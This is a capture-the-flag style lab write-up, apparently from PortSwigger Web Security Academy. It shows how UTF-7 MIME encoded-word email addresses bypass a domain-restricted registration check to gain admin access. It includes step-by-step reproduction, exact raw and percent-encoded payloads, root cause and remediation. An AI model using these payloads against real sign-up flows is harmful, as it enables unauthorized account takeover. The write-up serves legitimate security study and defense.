# Bypassing Access Controls Using Email Address Parsing Discrepancies

**Platform:** PortSwigger Web Security Academy<br>
**Category:** Business Logic<br>
**Difficulty:** Expert<br>
**Date Solved:** 2026-11-02<br>
**Severity:** Critical<br>

## Summary

The registration flow grants admin/staff privileges to any account whose email ends in `@ginandjuice.shop`. The domain check runs against the raw submitted string, but the actual confirmation-email delivery logic decodes MIME encoded-word syntax first. Known obfuscation attempts (Q-encoding, in both ISO-8859-1 and UTF-8 charsets) are explicitly detected and blocked, but UTF-7 encoded-word syntax is not. By UTF-7-encoding the `@` and space characters, a crafted email can be made to decode to an attacker-controlled address while the raw string still ends in `@ginandjuice.shop`, satisfying the domain check. The confirmation email is delivered to the attacker's address, and once confirmed, the account receives the domain's privileged access — all without ever controlling a real `@ginandjuice.shop` mailbox.

## Affected Component

- `POST /register` — email field, domain-restriction validator
- Mail-sending logic (decodes MIME encoded-word syntax before dispatching the confirmation email — separate code path from the validator)
- Account privilege assignment — grants admin access based on the stored email's domain suffix

## Steps to Reproduce

1. Attempt registration with a non-matching domain (`foo@exploit-server.net`) → blocked: must use an `@ginandjuice.shop` email.

2. Test Q-encoded obfuscation — both get explicitly blocked with "Registration blocked for security reasons":
   ```
   =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
   =?utf-8?q?=61=62=63?=foo@ginandjuice.shop
   ```
   This confirms the app has some encoding-awareness, but only for these specific encodings.

3. Test UTF-7 encoded-word syntax: `=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop` — **not blocked**. The validator doesn't recognize UTF-7 as a threat.

4. Build the exploit payload: UTF-7-encode the `@` and the space character so the decoded result is the attacker's real address, while the raw string still ends in the target domain:
   ```
   =?utf-7?q?attacker&AEA-exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net&ACA-?=@ginandjuice.shop
   ```
   `&AEA-` decodes to `@`, `&ACA-` decodes to a space — both computed via UTF-7's modified-base64 shift encoding (UTF-16BE bytes of the character, base64-encoded, padding stripped).

5. Submit via Burp Repeater with the raw body manually edited — **not** through the browser form, since HTML5 email-input validation rejects the raw `&` client-side. The literal `&`, `=`, `?`, `@` characters in the payload must be percent-encoded (`%26`, `%3D`, `%3F`, `%40`) before being placed in the `application/x-www-form-urlencoded` body, or the form parser truncates the value at the first raw `&`.

6. On success, the UI displays the raw stored string as the account's email (undecoded — the display layer never decodes it). The confirmation email, however, is delivered to the attacker's real exploit-server inbox, because the mail-dispatch logic decodes the UTF-7 first.

7. Open the confirmation email at the attacker-controlled address, click the activation link.

8. Log in with the registered credentials → admin panel is now accessible (the stored email's raw string genuinely ends in `@ginandjuice.shop`, so the privilege-grant logic — which is otherwise working correctly — fires as designed).

9. Delete `carlos` via the admin panel → lab solved.

## Proof of Concept

Form-encoded email parameter value submitted:
```
%3D%3Futf-7%3Fq%3Fattacker%26AEA-exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net%26ACA-%3F%3D%40ginandjuice.shop
```

Decodes (via the mail-dispatch parser) to:
```
attacker@exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net
```

Raw stored value (what the validator and UI both see):
```
=?utf-7?q?attacker&AEA-exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net&ACA-?=@ginandjuice.shop
```

## Root Cause

```
Validator:        checks raw string → ends in "@ginandjuice.shop"? YES → allowed
Mail dispatcher:   decodes MIME encoded-word/UTF-7 FIRST → real recipient
                    is attacker@exploit-server.net
Privilege grant:   checks raw stored string → ends in "@ginandjuice.shop"? YES
                    → grants admin (this check is not itself broken —
                    it's correctly matching a string that genuinely has
                    that suffix)

Gap: two different code paths (validator/privilege-check vs. mail
     dispatcher) read the same raw string and disagree on what address
     it actually represents, because only one of them decodes MIME
     encoded-word syntax before acting on it.
```

## Impact

**Technical**
- Full bypass of email-domain-based access control with no ownership of the privileged domain
- Account receives legitimate admin/staff privileges exactly as if a real employee had registered

**Business / Real-World**
- Complete impersonation of a trusted-domain account (admin takeover in this lab; could be any domain-gated tier — enterprise SSO auto-join, internal tools, staff-only features)
- No interaction needed from any real employee/victim — entirely self-contained to the attacker

**Scope**
- Any domain-restricted registration or email-change flow in the application

## Remediation

1. Normalize/decode the email string (including MIME encoded-word and any other RFC 2047 encodings) **before** running the domain-restriction check, so the validator sees the same value the mail system will actually deliver to
2. Use the same parsing library/logic for validation and for mail dispatch — never two independently-maintained parsers operating on the same field
3. Reject or strip MIME encoded-word syntax entirely in fields that aren't meant to carry internationalized header content (a plain web registration form email field has no legitimate need for RFC 2047 syntax)
4. Don't grant privileges based solely on an unverified string match — require a secondary verification step tied to the actual delivery address, not just the stored raw value

## Lessons Learned & Patterns

- Any domain-based "if you work for X" / auto-join-by-email-domain feature is worth testing for this exact validator-vs-dispatcher parsing mismatch — it's a common real-world SaaS onboarding pattern, not a lab-only construct.
- Cheap recon before committing to the full exploit: test Q-encoding (ISO-8859-1 and UTF-8) first. A distinct "suspicious encoding" error (vs. a generic format error) confirms the app has *some* encoding-awareness — meaning there's a real chance it missed a less common one like UTF-7.
- When manually crafting a payload with special characters (`&`, `=`, `?`, `@`) for a raw `application/x-www-form-urlencoded` body in Burp, always percent-encode those characters first — pasting them raw lets the form parser treat them as field delimiters and silently truncates the real payload, producing a misleading generic error instead of the expected one.
- Browser-native `type="email"` input validation will block malformed-looking payloads client-side before they're even sent — always intercept and edit in Burp rather than relying on the browser form for this class of payload.
- This is a rare bug class in practice (PortSwigger rates it Expert-tier, and it needs awareness of a specific whitepaper technique most hunters never encounter) — but when the domain-trust pattern exists on a real target, the cost to test for it is low and the payout ceiling is high (full privileged-account takeover).

## References

- PortSwigger Lab: Bypassing access controls using email address parsing discrepancies
- Whitepaper: "Splitting the Email Atom: Exploiting Parsers to Bypass Access Controls" — Gareth Heyes, PortSwigger Research
- Script used: [`email_parser_bypass.py`](https://github.com/MalikHettige/scripts-tools/blob/main/business-logic/Bypassing%20access%20controls%20using%20email%20address%20parsing%20discrepancies/email_parser_bypass.py)

**Tags:** #PortSwigger #BusinessLogic #AccessControl #EmailParsing #UTF7 #ParserDiscrepancy #Expert
